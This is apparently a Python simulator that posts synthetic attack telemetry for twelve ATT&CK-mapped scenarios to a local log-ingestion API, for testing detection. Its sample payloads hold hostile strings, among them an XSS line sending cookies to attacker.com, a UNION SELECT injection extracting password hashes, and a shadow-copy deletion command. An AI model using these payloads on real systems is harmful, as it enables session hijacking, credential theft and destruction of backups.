import urllib.request
import json
import time
import sys
import random

SCENARIOS = {
    "brute_force": {
        "title": "Windows Password Spray & Brute Force Attack",
        "tactic": "Credential Access (T1110)",
        "source_type": "windows_event",
        "severity": "HIGH",
        "event_id": 4625,
        "host_name": "DC-PRIMARY-01",
        "src_ip": "185.220.101.5",
        "user_name": "administrator",
        "stages": [
            {"name": "Recon", "description": "Enumerate valid usernames via LDAP anonymous queries"},
            {"name": "Spray", "description": "Password spray attack with common passwords against 50+ accounts"},
            {"name": "Access", "description": "Successful authentication with compromised credentials"}
        ],
        "raw_payload": {"EventID": 4625, "TargetUserName": "administrator", "Status": "0xC000006D", "SubStatus": "0xC000006A", "IpAddress": "185.220.101.5", "LogonType": 3}
    },
    "powershell_enc": {
        "title": "Encoded PowerShell Reverse Shell Execution",
        "tactic": "Execution (T1059.001)",
        "source_type": "sysmon",
        "severity": "CRITICAL",
        "event_id": 1,
        "host_name": "FINANCE-PC",
        "process_name": "powershell.exe",
        "user_name": "m.taylor",
        "src_ip": "10.0.4.15",
        "stages": [
            {"name": "Delivery", "description": "Phishing email with malicious Office macro downloads PowerShell payload"},
            {"name": "Execution", "description": "powershell.exe -enc executes Base64-encoded reverse shell"},
            {"name": "C2", "description": "Beacon establishes encrypted C2 channel to external server"}
        ],
        "raw_payload": {"EventID": 1, "Image": "C:\\Windows\\System32\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentPID": 1234}
    },
    "sqli": {
        "title": "Web Application SQL Injection Web Attack",
        "tactic": "Initial Access (T1190)",
        "source_type": "apache",
        "severity": "HIGH",
        "host_name": "WEB-PROD-01",
        "src_ip": "45.33.32.156",
        "stages": [
            {"name": "Recon", "description": "Probe web endpoints for vulnerable parameters"},
            {"name": "Exploit", "description": "UNION SELECT payload extracts user credential hashes"},
            {"name": "Exfil", "description": "Extracted data exfiltrated via HTTP outbound channel"}
        ],
        "raw_payload": {"request": "GET /api/users?id=1' UNION SELECT username, password_hash FROM users-- HTTP/1.1", "status": 200, "user_agent": "sqlmap/1.5#stable", "response_bytes": 15240}
    },
    "dns_tunnel": {
        "title": "DNS Data Exfiltration Tunneling",
        "tactic": "Command & Control (T1071.004)",
        "source_type": "zeek",
        "severity": "HIGH",
        "host_name": "WORKSTATION-01",
        "src_ip": "192.168.1.105",
        "stages": [
            {"name": "Setup", "description": "Attacker registers malicious domain with NS record pointing to C2 server"},
            {"name": "Beacon", "description": "DNS TXT queries with encoded data in subdomain labels"},
            {"name": "Exfil", "description": "Data compressed into 4KB chunks per DNS query"}
        ],
        "raw_payload": {"query": "v8a9f8s9d8f9s8d9f8.exfil.attacker.com", "qtype": "TXT", "bytes_out": 4096, "query_count": 47}
    },
    "ransomware": {
        "title": "Ransomware Shadow Copy Deletion & Encryption",
        "tactic": "Impact (T1486)",
        "source_type": "sysmon",
        "severity": "CRITICAL",
        "event_id": 1,
        "host_name": "DEV-SERVR-01",
        "process_name": "vssadmin.exe",
        "stages": [
            {"name": "Execution", "description": "Ransomware binary executes with SYSTEM privileges"},
            {"name": "Defense Evasion", "description": "vssadmin.exe delete shadows /all /quiet removes backups"},
            {"name": "Impact", "description": "File encryption begins with AES-256, ransom note written"}
        ],
        "raw_payload": {"EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "User": "NT AUTHORITY\\SYSTEM", "ParentImage": "C:\\Windows\\System32\\services.exe"}
    },
    "lsass_dump": {
        "title": "LSASS Memory Dumping (Mimikatz)",
        "tactic": "Credential Access (T1003.001)",
        "source_type": "sysmon",
        "severity": "CRITICAL",
        "event_id": 10,
        "host_name": "DC-PRIMARY-01",
        "process_name": "lsass.exe",
        "user_name": "SYSTEM",
        "src_ip": "10.0.4.88",
        "stages": [
            {"name": "Execution", "description": "Mimikatz or procdump executed with SeDebugPrivilege"},
            {"name": "Dump", "description": "LSASS process memory dumped to disk (lsass.dmp)"},
            {"name": "Extraction", "description": "Credentials extracted from dump offline"}
        ],
        "raw_payload": {"EventID": 10, "Image": "C:\\Windows\\System32\\lsass.exe", "TargetImage": "C:\\Windows\\Temp\\lsass.dmp", "GrantedAccess": 0x1FFFFF, "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+C:\\Tools\\mimikatz.exe"}
    },
    "kerberoast": {
        "title": "Kerberoasting Service Ticket Request",
        "tactic": "Credential Access (T1558.003)",
        "source_type": "windows_event",
        "severity": "HIGH",
        "event_id": 4769,
        "host_name": "DC-PRIMARY-01",
        "user_name": "svc_backup",
        "src_ip": "10.0.4.88",
        "stages": [
            {"name": "Recon", "description": "Enumerate SPNs for high-privilege service accounts via LDAP"},
            {"name": "Request", "description": "Request TGS tickets for target service accounts"},
            {"name": "Crack", "description": "Offline brute force of TGS tickets to recover service account password"}
        ],
        "raw_payload": {"EventID": 4769, "TargetUserName": "svc_backup", "ServiceName": "MSSQLSvc/SQL-PROD-01.corp.internal:1433", "TicketOptions": "0x40810000", "TicketEncryptionType": "0x17"}
    },
    "scheduled_task": {
        "title": "Persistence via Scheduled Task",
        "tactic": "Persistence (T1053.005)",
        "source_type": "windows_event",
        "severity": "HIGH",
        "event_id": 4698,
        "host_name": "WORKSTATION-01",
        "process_name": "schtasks.exe",
        "user_name": "j.doe",
        "stages": [
            {"name": "Execution", "description": "Schtasks.exe creates scheduled task triggered at logon"},
            {"name": "Persistence", "description": "Task executes PowerShell payload every 30 minutes"},
            {"name": "Execution", "description": "C2 beacon establishes persistent backdoor access"}
        ],
        "raw_payload": {"EventID": 4698, "TaskName": "\\Microsoft\\Windows\\Updater\\SystemCheck", "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><task><Triggers><LogonTrigger><UserId>CORP\\j.doe</UserId></LogonTrigger></Triggers><Actions><Exec><Command>powershell.exe</Command><Arguments>-enc JABjAGwAaQBlAG4AdAA</Arguments></Exec></Actions></task>", "ClientProcessId": 8912}
    },
    "golden_ticket": {
        "title": "Kerberos Golden Ticket Forgery",
        "tactic": "Privilege Escalation (T1558.001)",
        "source_type": "windows_event",
        "severity": "CRITICAL",
        "event_id": 4624,
        "host_name": "DC-PRIMARY-01",
        "user_name": "KRBTGT",
        "src_ip": "10.0.4.88",
        "stages": [
            {"name": "Access", "description": "Attacker gains DA-level access to domain controller"},
            {"name": "Extract", "description": "KRBTGT hash dumped via DCSync attack"},
            {"name": "Forge", "description": "Golden ticket forged with 10-year validity granting domain admin"}
        ],
        "raw_payload": {"EventID": 4624, "TargetUserName": "Administrator", "LogonType": 3, "AuthenticationPackage": "Kerberos", "WorkstationName": "ATTACKER-PC", "IpAddress": "10.0.4.88", "KeyLength": 0}
    },
    "arp_spoof": {
        "title": "ARP Cache Poisoning / Man-in-the-Middle",
        "tactic": "Credential Access (T1557.002)",
        "source_type": "suricata",
        "severity": "HIGH",
        "host_name": "GATEWAY-01",
        "src_ip": "192.168.1.99",
        "stages": [
            {"name": "Probe", "description": "Attacker scans subnet for active hosts"},
            {"name": "Poison", "description": "Gratuitous ARP responses poison gateway-to-target cache"},
            {"name": "Capture", "description": "Intercepted traffic forwarded through attacker machine"}
        ],
        "raw_payload": {"alert": "ARP Spoofing Detected", "protocol": "ARP", "src_mac": "00:1A:2B:3C:4D:5E", "target_ip": "192.168.1.1", "spoofed_ip": "192.168.1.105", "packet_count": 250}
    },
    "xss_exfil": {
        "title": "Stored XSS Session Hijacking",
        "tactic": "Initial Access (T1189)",
        "source_type": "nginx",
        "severity": "HIGH",
        "host_name": "WEB-PROD-01",
        "src_ip": "45.33.32.156",
        "stages": [
            {"name": "Inject", "description": "Malicious script injected into vulnerable comment field"},
            {"name": "Trigger", "description": "Admin browser executes stored XSS payload"},
            {"name": "Exfil", "description": "Session cookie exfiltrated to attacker-controlled server"}
        ],
        "raw_payload": {"request": "POST /submit-comment HTTP/1.1", "body": "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>", "user_agent": "Mozilla/5.0 (XSS Payload)", "status": 200}
    },
    "port_scan": {
        "title": "Nmap Reconnaissance Port Scan",
        "tactic": "Discovery (T1046)",
        "source_type": "firewall",
        "severity": "MEDIUM",
        "host_name": "FIREWALL-01",
        "src_ip": "185.220.101.5",
        "stages": [
            {"name": "Recon", "description": "SYN scan against public subnet /24 range"},
            {"name": "Identify", "description": "Service version detection on open ports (80,443,22,3389)"},
            {"name": "Enumerate", "description": "OS fingerprinting and full port sweep"}
        ],
        "raw_payload": {"action": "DENY", "protocol": "TCP", "src_port": 54123, "dest_port": 3389, "flags": "SYN", "bytes": 44, "signature": "Nmap SYN Scan", "count_30s": 1500}
    }
}

def trigger_attack(scenario_key, stage_index=None):
    scenario = SCENARIOS.get(scenario_key)
    if not scenario:
        print(f"Unknown scenario: {scenario_key}")
        return False

    url = "http://localhost:5000/api/logs"
    payload = {
        "source_type": scenario["source_type"],
        "host_name": scenario["host_name"],
        "severity": scenario["severity"],
        "event_id": scenario.get("event_id"),
        "process_name": scenario.get("process_name"),
        "user_name": scenario.get("user_name"),
        "src_ip": scenario.get("src_ip"),
        "raw_payload": scenario["raw_payload"],
        "is_simulated": 1
    }

    if stage_index is not None and "stages" in scenario:
        stages = scenario["stages"]
        if stage_index < len(stages):
            stage = stages[stage_index]
            payload["raw_payload"]["attack_stage"] = stage["name"]
            payload["raw_payload"]["stage_description"] = stage["description"]
        else:
            print(f"Invalid stage index {stage_index} for {scenario_key}")
            return False

    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )

    try:
        with urllib.request.urlopen(req, timeout=3) as res:
            res_body = res.read().decode('utf-8')
            title = scenario["title"]
            stage_note = f" - Stage: {stages[stage_index]['name']}" if stage_index is not None and "stages" in scenario else ""
            print(f"[Attack Simulator] Successfully triggered '{title}'{stage_note}: {res_body}")
            return True
    except Exception as e:
        print(f"[Attack Simulator] Error sending attack telemetry: {e}")
        return False

def run_multi_stage(scenario_key):
    scenario = SCENARIOS.get(scenario_key)
    if not scenario:
        print(f"Unknown scenario: {scenario_key}")
        return
    stages = scenario.get("stages", [])
    if not stages:
        trigger_attack(scenario_key)
        return
    print(f"\n[Attack Simulator] Starting multi-stage execution: {scenario['title']}")
    for i, stage in enumerate(stages):
        print(f"  Executing stage {i+1}/{len(stages)}: {stage['name']} - {stage['description']}")
        trigger_attack(scenario_key, stage_index=i)
        if i < len(stages) - 1:
            time.sleep(0.5)
    print(f"[Attack Simulator] Multi-stage execution complete: {scenario['title']}\n")

if __name__ == '__main__':
    key = sys.argv[1] if len(sys.argv) > 1 else "brute_force"
    mode = sys.argv[2] if len(sys.argv) > 2 else "single"
    if mode == "multi":
        run_multi_stage(key)
    else:
        trigger_attack(key)
